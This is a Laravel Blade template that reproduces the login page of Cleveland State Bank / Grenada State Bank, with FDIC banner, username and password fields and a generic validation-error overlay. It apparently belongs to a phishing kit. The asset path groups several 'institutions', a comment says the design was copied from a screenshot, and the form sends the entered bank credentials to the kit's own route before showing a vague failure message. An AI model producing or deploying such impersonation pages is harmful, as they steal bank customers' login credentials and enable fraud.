<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>Cleveland State Bank</title>

<link rel="apple-touch-icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}">
<link rel="icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}" type="image/x-icon">

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    min-height: 100vh;
    background-color: #edf0f4;
    background-image: url("{{ asset('assets/institutions/clevelandstatebank/images/csb-bg-ribbons.svg') }}");
    background-size: cover;
    background-position: center center;
    background-repeat: no-repeat;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    position: relative;
    overflow-x: hidden;
}

/* FDIC Header */
.fdic-header {
    padding: 16px 24px;
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 11px;
    color: #1a2d54;
    font-family: Arial, Helvetica, sans-serif;
    letter-spacing: 0.1px;
}

.fdic-badge {
    font-weight: 900;
    font-size: 13px;
    color: #0b2246;
    letter-spacing: 0.5px;
}

/* Login Center Container */
.login-center-wrapper {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px 16px;
    margin-top: -30px;
}

.csb-stacked-logo {
    width: 210px;
    height: auto;
    max-height: 250px;
    object-fit: contain;
    margin-bottom: 24px;
    display: block;
}

.login-form-box {
    width: 100%;
    max-width: 320px;
}

.csb-input-container {
    background: #ffffff;
    border: 1px solid #b8bec5;
    border-radius: 1px;
    margin-bottom: 8px;
    position: relative;
    height: 48px;
    display: flex;
    align-items: center;
}

.csb-input-container input {
    width: 100%;
    height: 100%;
    border: none;
    outline: none;
    background: transparent;
    padding: 0 14px;
    font-size: 13px;
    font-family: Arial, Helvetica, sans-serif;
    font-weight: bold;
    color: #444444;
    letter-spacing: 0.6px;
}

.csb-input-container input::placeholder {
    color: #7d8590;
    font-weight: 500;
    letter-spacing: 0.8px;
}

.csb-show-btn {
    position: absolute;
    right: 14px;
    background: none;
    border: none;
    cursor: pointer;
    font-size: 12px;
    font-weight: bold;
    color: #1b325f;
    letter-spacing: 0.5px;
    padding: 6px;
}

.csb-show-btn:hover {
    color: #c8232c;
}

.csb-btn-signin {
    width: 100%;
    height: 46px;
    background-color: #1e355b;
    border: none;
    border-radius: 1px;
    color: #ffffff;
    font-size: 13px;
    font-weight: bold;
    letter-spacing: 0.8px;
    cursor: pointer;
    margin-top: 6px;
    transition: background-color 0.15s;
}

.csb-btn-signin:hover {
    background-color: #152744;
}

/* Remember Username row */
.remember-row {
    margin-top: 18px;
    text-align: left;
    position: relative;
    padding-bottom: 6px;
    border-bottom: 1.5px solid #d45b5b;
}

.remember-label {
    font-size: 13px;
    color: #1b325f;
    font-weight: 500;
    cursor: pointer;
    display: inline-flex;
    align-items: center;
    gap: 7px;
}

.remember-label input[type="checkbox"] {
    accent-color: #1e355b;
    cursor: pointer;
}

/* Links row */
.csb-nav-links {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 28px;
    margin-top: 14px;
}

.csb-nav-links a {
    color: #3b5078;
    font-size: 12px;
    text-decoration: none;
    font-weight: 500;
    transition: color 0.15s;
}

.csb-nav-links a:hover {
    color: #1b325f;
    text-decoration: underline;
}

/* Bottom Bar */
.bottom-bar {
    display: flex;
    justify-content: space-between;
    align-items: flex-end;
    padding: 18px 24px;
}

.bottom-left-icons {
    display: flex;
    align-items: center;
    gap: 10px;
}

.red-circle-icon {
    width: 32px;
    height: 32px;
    border-radius: 50%;
    background-color: #c8232c;
    color: #ffffff;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 15px;
    font-weight: bold;
    text-decoration: none;
    box-shadow: 0 2px 4px rgba(0,0,0,0.15);
}

.red-circle-icon svg {
    width: 16px;
    height: 16px;
    fill: #ffffff;
}

.bottom-right-links {
    display: flex;
    align-items: center;
    gap: 6px;
}

.privacy-link {
    color: #c8232c;
    font-size: 12px;
    text-decoration: none;
    font-weight: 500;
}

.privacy-link:hover {
    text-decoration: underline;
}

.ehl-icon {
    width: 16px;
    height: 16px;
    fill: #c8232c;
}

/* Error Banner Modal (Screenshot 5) */
.csb-error-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: rgba(0, 0, 0, 0.45);
    z-index: 9999;
    display: flex;
    align-items: center;
    justify-content: center;
}

.csb-error-banner {
    width: 100%;
    background-color: #262626;
    color: #ffffff;
    padding: 32px 20px;
    text-align: center;
    box-shadow: 0 8px 30px rgba(0,0,0,0.6);
}

.csb-error-title {
    font-size: 14px;
    font-weight: bold;
    color: #e0e0e0;
    letter-spacing: 0.8px;
    margin-bottom: 12px;
    text-transform: uppercase;
}

.csb-error-desc {
    font-size: 13.5px;
    line-height: 1.5;
    color: #ffffff;
    max-width: 600px;
    margin: 0 auto 20px;
}

.csb-error-btn {
    background-color: #d9534f;
    border: none;
    color: #ffffff;
    font-size: 13px;
    font-weight: bold;
    padding: 8px 36px;
    border-radius: 2px;
    cursor: pointer;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.csb-error-btn:hover {
    background-color: #c9302c;
}
</style>
</head>
<body>

    <!-- FDIC Header (Top Left) -->
    <header class="fdic-header">
        <span class="fdic-badge">FDIC</span>
        <span class="fdic-text">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
    </header>

    <!-- Center Login Stack -->
    <main class="login-center-wrapper">
        <img src="{{ asset('assets/institutions/clevelandstatebank/images/csb-stacked-logo.png') }}" alt="Cleveland State Bank / Grenada State Bank" class="csb-stacked-logo">

        <form method="POST" action="{{ route('login') }}" class="login-form-box" id="csbLoginForm" autocomplete="on">
            @csrf

            <div class="csb-input-container">
                <input 
                    type="text" 
                    id="username" 
                    name="email" 
                    value="{{ old('email') }}" 
                    placeholder="USERNAME" 
                    required 
                    autofocus 
                    autocomplete="username"
                >
            </div>

            <div class="csb-input-container">
                <input 
                    type="password" 
                    id="password" 
                    name="password" 
                    placeholder="PASSWORD" 
                    required 
                    autocomplete="current-password"
                >
                <button type="button" class="csb-show-btn" id="toggleShow">SHOW</button>
            </div>

            <button type="submit" class="csb-btn-signin">SIGN IN</button>

            <div class="remember-row">
                <label class="remember-label">
                    <input type="checkbox" name="remember" {{ old('remember') ? 'checked' : '' }}>
                    <span>Remember Username</span>
                </label>
            </div>

            <div class="csb-nav-links">
                <a href="{{ route('register') }}">Sign Up</a>
                <a href="{{ route('password.request') }}">Forgot Password</a>
            </div>
        </form>
    </main>

    <!-- Bottom Bar -->
    <footer class="bottom-bar">
        <div class="bottom-left-icons">
            <a href="{{ route('home') }}" class="red-circle-icon" title="Information">
                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
            </a>
            <a href="{{ route('home') }}" class="red-circle-icon" title="Locations">
                <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
            </a>
        </div>

        <div class="bottom-right-links">
            <a href="{{ route('home') }}" class="privacy-link">Privacy Policy</a>
            <svg class="ehl-icon" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
        </div>
    </footer>

    <!-- Error Banner Overlay (Shown when error exists) -->
    @if ($errors->any() || session('error'))
    <div class="csb-error-overlay" id="errorOverlay">
        <div class="csb-error-banner">
            <div class="csb-error-title">AN ERROR HAS OCCURRED</div>
            <div class="csb-error-desc">
                The information you entered could not be properly validated.<br>
                Please double check your information and if you feel it is<br>
                correct please contact your financial institution for further help.
            </div>
            <button type="button" class="csb-error-btn" onclick="document.getElementById('errorOverlay').style.display='none'">OK</button>
        </div>
    </div>
    @endif

    <script>
    document.addEventListener('DOMContentLoaded', function () {
        var toggleBtn = document.getElementById('toggleShow');
        var pwdInput  = document.getElementById('password');

        if (toggleBtn && pwdInput) {
            toggleBtn.addEventListener('click', function () {
                if (pwdInput.type === 'password') {
                    pwdInput.type = 'text';
                    toggleBtn.textContent = 'HIDE';
                } else {
                    pwdInput.type = 'password';
                    toggleBtn.textContent = 'SHOW';
                }
            });
        }
    });
    </script>
</body>
</html>
